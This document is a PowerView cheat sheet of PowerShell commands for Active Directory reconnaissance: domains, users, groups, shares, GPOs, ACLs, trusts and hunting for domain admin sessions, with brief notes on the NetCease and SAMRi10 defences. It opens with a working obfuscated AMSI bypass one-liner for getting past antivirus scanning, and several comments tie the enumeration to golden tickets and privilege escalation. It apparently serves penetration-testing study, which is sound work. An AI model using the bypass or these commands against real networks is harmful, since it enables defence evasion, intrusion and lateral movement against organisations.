# PowerView

- [PowerView](#powerview)
  - [Loading PowerView](#loading-powerview)
  - [Domains](#domains)
  - [Users](#users)
  - [Computers](#computers)
  - [Groups](#groups)
  - [Files & Shares](#files--shares)
  - [Group Policy](#group-policy)
  - [Organizational Units](#organizational-units)
  - [Access Control Lists](#access-control-lists)
  - [Trusts](#trusts)
  - [Forest Mapping](#forest-mapping)
  - [User Hunting](#user-hunting)
    - [Defending against User Hunting](#defending-against-user-hunting)
      - [NetCease](#netcease)
      - [SAMRi10](#samri10)

More useful commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## Loading PowerView

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1
```

## Domains

- General domain information
- Password policy
- Ticket policy, interesting for crafting appropriate golden/silver tickets
- List of domain controllers and HVTs

```powershell
# Get current domain
Get-NetDomain

# Get object of another domain
Get-NetDomain -Domain lab.local

# Get domain SID for current domain
Get-DomainSID

# Get domain policy for current domain
Get-DomainPolicy
(Get-DomainPolicy)."System Access"

# Get domain policy for another domain
# Password policy
(Get-DomainPolicy -Domain lab.local)."System Access"

# Kerberos policy for e.g. mimikatz golden tickets
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

# Get domain controllers for current domain
Get-NetDomainController

# Get domain controllers for another domain
Get-NetDomainController -Domain lab.local
```

## Users

- List of users
- Inactive users
- Possible honeypot users with very low logon counts

```powershell
# Get list of users in current domain
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | Select cn

# Find all users with an SPN (likely service accounts)
Get-NetUser -SPN

# Find all service accounts in "Domain Admins"
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Get list of all properties for users in current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"

# Get actively logged on users on a computer (needs local admin rights on the target)
Get-NetLoggedOn -ComputerName dc.lab.local

# Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS)
Get-LoggedOnLocal -ComputerName dc.lab.local

# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
Get-LastLoggedOn -ComputerName dc.lab.local
```

## Computers

- Types of computers
- Roles of computers
- Used operating systems
- Live hosts

```powershell
# Get list of computers in current domain
Get-NetComputer
Get-NetComputer -FullData

# Check for live hosts (depends on ICMP)
Get-NetComputer -Ping

# Information about operating systems
Get-NetComputer -OperatingSystem "*Server 2016"
Get-NetComputer -FullData | select dnshostname,operatingsystem

# Get list of sessions on computer
Get-NetSession -ComputerName "dc01.lab.local"
```

## Groups

- Intersting domain and local groups
- Group members
- Group membership for current user
- Query information about groups from forest root, e.g. for Enterprise Admins
- If RID is 5xx, it is built in, otherwise custom

```powershell
# Get all groups in current domain
Get-NetGroup
Get-NetGroup -FullData

# Get information about groups in other domain
Get-NetGroup -Domain lab.local

# Get all groups containing the word "admin" in group name
Get-NetGroup "*admin*"

# Get information about specific group
Get-NetGroup -FullData "Domain Admins"

# Get all members of Domain Admins group
# If member is a group, get members of that group as well
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Get list of Enterprise Admins, only available from forest root
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain lab.local

# Get group membership for a user
Get-NetGroup -UserName "student1"

# List all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -ListGroups

# Get members of all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -Recurse
```

## Files & Shares

```powershell
# Find shares on hosts in current domain
Invoke-ShareFinder -Verbose

# Find shares from other domain
Invoke-ShareFinder -Domain lab.local

# Exclude default shares
Invoke-ShareFinder -ExcludeStandard

# Show only shares the current user has access to
Invoke-ShareFinder -CheckShareAccess

# Find sensitive files on computers in the domain
Invoke-FileFinder -Verbose

# Get all fileservers of the domain
Get-NetFileServer
```

## Group Policy

- Security settings
- Registry-based policy settings
- GPP like start/shutdown/log-on/logff script settings
- Software installation
- Abused for privesc, backdoors, persistence

```powershell
# Display RSoP summary data
gpresult /R

# Get list of GPO in current domain
Get-NetGPO
Get-NetGPO | Select displayname
Get-NetGPO -ComputerName ws01.lab.local

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-NetGPOGroup

# Get users which are in a local group of a machine using GPO
Find-GPOComputerAdmin -ComputerName ws01.lab.local

# Get machines where the given user is member of a specific group
Find-GPOLocation -UserName user -Verbose
```

## Organizational Units

```powershell
# Get OUs in a domain
Get-NetOU -FullData

# Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
```

## Access Control Lists

- Access Control Entries (ACE) correspond to individual permission or audits access
- Who has permission and what can be done on an object?
- Two types:
  - DACL -> Defines the permissions trustees (a user or group) have on an object
  - SACL - Logs success and failure audit messages when an object is accessed

```powershell
# Get the ACLs associated with the specified object
Get-ObjectACL -SamAccountName "Users" -ResolveGUIDs

# Get the ACLs associated with the specified prefix to be used for search
Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose

# Get the ACLs associated with the specified LDAP path to be used for search
Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Get the ACLs associated with the specified path
Get-PathACL -Path "\\dc01.lab.local\sysvol"
```

## Trusts

- Relationship between two domains or forest
- Trusted Domain Objects (TDOs) represent trust relationship in a domain
- Types of trusts
  - One-way: users in trusted domain can access resources in the trusting domain
  - Two-way trust: users of both domains can access resources in the other domain
  - Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest)
  - Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests)
  - Automatic trust: created automatically when creating new subdomain (parent-child, tree-root)
  - Shortcut trusts: used to reduce access time in complex trust scenarios
  - External trusts: between two domains in different forests when forests do not have a turst relationships
  - Forest trusts: between forest root domains

```powershell
# Get a list of all domain trusts for the current domain
Get-NetDomainTrust
Get-NetDomainTrust -Domain test.lab.local
```

## Forest Mapping

```powershell
# Get details about the current forest
Get-NetForest
Get-NetForest -Forest lab.local

# Get all domains in the current forest
Get-NetForestDomain
Get-NetForestDomain -Forest lab.local

# Get all global catalogs for the current forest
Get-NetForestCatalog
Get-NetForestCatalog -Forest lab.local

# Map trusts of a forest
Get-NetForestTrust
Get-NetForestTrust -Forest lab.local

# Map all trusts in current forest
Get-NetForestDomain |  Get-NetDomainTrust
```

## User Hunting

```powershell
# Find all machines on the current domain where the current user has local admin access
# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.
# Can also be done using WMI and PowerShell Remoting
# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain (needs administrator privs on non-dc machines).
# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Get-NetLocalGroup on each machine.
Invoke-EnumerateLocalAdmin -Verbose

# Find computers where a domain admin (or specified user/group) has sessions
# This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list of computers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession/Get-NetLoggedon ) from each
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"

# To confirm admin access
Invoke-UserHunter -CheckAccess

# Find computers where a domain admin is logged-in.
# This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.
Invoke-UserHunter -Stealth
```

### Defending against User Hunting

#### NetCease

- Script to change permissions on `NetSessionEnum` method by removing permissions for `Authenticated Users` group
- Fails many of the attacker's session enumeration and hence user hunting capabilities

```powershell
.\NetCease.ps1
```

#### SAMRi10

- From same author as NetCease
- Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)
- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b
